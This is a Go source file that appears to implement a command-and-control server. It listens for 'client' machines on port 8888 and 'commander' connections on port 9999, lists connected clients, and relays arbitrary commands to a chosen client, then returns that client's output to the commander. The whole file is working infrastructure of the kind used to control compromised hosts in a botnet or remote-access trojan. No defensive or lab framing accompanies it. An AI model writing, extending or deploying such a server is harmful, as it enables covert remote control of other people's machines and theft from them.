package main

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"sync"
)

// Client represents a connected client
type Client struct {
	conn net.Conn
}

var (
	clients   []*Client
	clientsMu sync.Mutex
)

func main() {
	// Start the server on port 8888 for clients
	go startClientServer(":8888")

	// Start the server on port 9999 for commanders
	startCommanderServer(":9999")
}

func startClientServer(address string) {
	l, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		return
	}
	defer l.Close()
	fmt.Println("Client server listening on", address)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting:", err.Error())
			continue
		}
		go handleClient(conn)
	}
}

func startCommanderServer(address string) {
	l, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		return
	}
	defer l.Close()
	fmt.Println("Commander server listening on", address)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting:", err.Error())
			continue
		}
		go handleCommander(conn)
	}
}
func removeClient(conn net.Conn) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for i, client := range clients {
		if client.conn == conn {
			clients = append(clients[:i], clients[i+1:]...)
			break
		}
	}
}

func handleClient(conn net.Conn) {
	clientsMu.Lock()
	clients = append(clients, &Client{conn: conn})
	clientsMu.Unlock()

	fmt.Println("Client connected:", conn.RemoteAddr())
}

func listClients(writer *bufio.Writer) {
	if len(clients) == 0 {
		writer.WriteString("No clients connected\n")
	}
	for _, client := range clients {
		_, err := writer.WriteString(client.conn.RemoteAddr().String() + "\n")
		if err != nil {
			fmt.Println("Error writing to commander:", err)
			break
		}
	}
}

func handleCommander(conn net.Conn) {
	defer conn.Close()

	clientsMu.Lock()
	defer clientsMu.Unlock()

	fmt.Println("Commander connected:", conn.RemoteAddr())

	writer := bufio.NewWriter(conn)

	// Read the message from the commander containing the destination client and command
	reader := bufio.NewReader(conn)
	command, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("Error reading command from commander:", err)
		return
	}
	command = strings.TrimSpace(command)
	if command == "LIST" {
		listClients(writer)
		writer.Flush()
		return
	}
	parts := strings.Split(command, "|")
	if len(parts) != 2 {
		fmt.Println("Invalid command format")
		return
	}
	destinationClient := parts[0]
	commandToExecute := parts[1]

	// Find the destination client
	var destinationConn net.Conn
	for _, client := range clients {
		if client.conn.RemoteAddr().String() == destinationClient {
			destinationConn = client.conn
			break
		}
	}

	if destinationConn == nil {
		fmt.Println("Destination client not found")
		return
	}

	// Send the command to the destination client
	_, err = destinationConn.Write([]byte(commandToExecute + "\n"))
	if err != nil {
		fmt.Println("Error sending command to client:", err)
		return
	}

	fmt.Println("Command sent to client", destinationClient, ":", commandToExecute)

	// Read the output of the command from the destination client and send it back to the commander
	output, err := bufio.NewReader(destinationConn).ReadString('\n')
	if err != nil {
		fmt.Println("Error reading output from client:", err)
		removeClient(destinationConn)
		return
	}

	// Send the output back to the commander
	_, err = conn.Write([]byte(output))
	if err != nil {
		fmt.Println("Error sending output to commander:", err)
		return
	}
}
